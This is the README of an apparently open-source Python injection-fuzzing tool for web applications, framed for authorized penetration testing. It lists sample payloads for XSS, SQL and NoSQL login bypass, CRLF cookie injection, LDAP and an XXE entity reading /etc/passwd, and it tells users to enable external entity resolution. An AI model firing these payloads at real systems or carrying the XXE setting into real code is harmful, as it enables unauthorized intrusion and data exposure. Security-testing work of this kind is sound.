# Fuzzing and Injection Testing Tool

This tool is a Python-based script designed for testing various injection vulnerabilities in web applications. It includes modules for testing XSS, SQL injection, NoSQL injection, OS command injection, CRLF injection, LDAP injection, XPath injection, XSLT injection, XXE vulnerabilities, and more.

## Features
- **Cross-Site Scripting (XSS)**
- **SQL Injection**
- **NoSQL Injection**
- **OS Command Injection**
- **HTTP Header Injection**
- **LDAP Injection**
- **CRLF Injection**
- **Unicode Injection**
- **XPath Injection**
- **XSLT Injection**
- **XML External Entity (XXE) Injection**

## Requirements
- Python 3.x
- Libraries:
  - `requests`
  - `json`
  - `ldap3`
  - `lxml`

Install the required dependencies using:
```bash
pip install requests ldap3 lxml
```
But, in XXE_checker, external entity references is turned off,so Please change from false to true

## Usage
Run the script with the target URL as an argument:
```bash
python fuzzing.py <URL>
```

### Example
```bash
python fuzzing.py https://example.com
```

## Payloads
This tool uses predefined payloads for various injection types. Below are some examples:

### XSS Payloads
```html
<script>alert('XSS');</script>
<img src=x onerror=alert('XSS')>
```

### SQL Injection Payloads
```sql
' OR '1'='1
1' UNION SELECT NULL, NULL--
```

### NoSQL Injection Payloads
```json
{ "username": { "$ne": "" } }
{ "username": "admin", "password": { "$ne": "" } }
```

### CRLF Injection Payloads
```text
%0d%0aSet-Cookie: admin=true
%0d%0aContent-Length: 0%0d%0aInjected-Header: test
```

### LDAP Injection Payloads
```ldap
*)(&(objectClass=*))
*)|(&(objectCategory=person)(objectClass=user))
```

### Unicode Injection Payloads
```text
%u0027
%u003Cscript%u003Ealert(1)%u003C/script%u003E
```

### XXE Payload
```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

## Functions

### `fuzz(url, params=None, payloads=None)`
Tests a given URL with payloads to detect general vulnerabilities.

### `test_nosql_injection(url)`
Tests for NoSQL injection vulnerabilities using JSON payloads.

### `test_csti(url)`
Tests for Server-Side Template Injection (CSTI).

### `test_header_injection(url, headers)`
Tests HTTP header injection by modifying headers with payloads.

### `test_ldap_injection(server, base_dn)`
Tests LDAP injection vulnerabilities.

### `test_json_injection(url, base_data)`
Tests JSON injection vulnerabilities by modifying JSON request bodies.

### `test_crlf_injection(url, param)`
Tests CRLF injection vulnerabilities by appending payloads to query parameters.

### `test_unicode_injection(url, param)`
Tests Unicode-based injection vulnerabilities.

### `scrape_xml(target_url)`
Fetches and parses XML data from the target URL.

### `test_xpath_injection(xml_data)`
Tests XPath injection vulnerabilities using XPath payloads.

### `test_xslt_injection(xml_data)`
Tests XSLT injection vulnerabilities using crafted XSLT payloads.

### `test_xxe(xml_data)`
Tests XXE vulnerabilities by processing XML with external entity references.

## Notes
- Ensure you have proper authorization before testing a target system.
- Use responsibly and only for ethical penetration testing.

## License
This tool is open-source and available under the MIT License. Feel free to use and modify it for your testing needs.

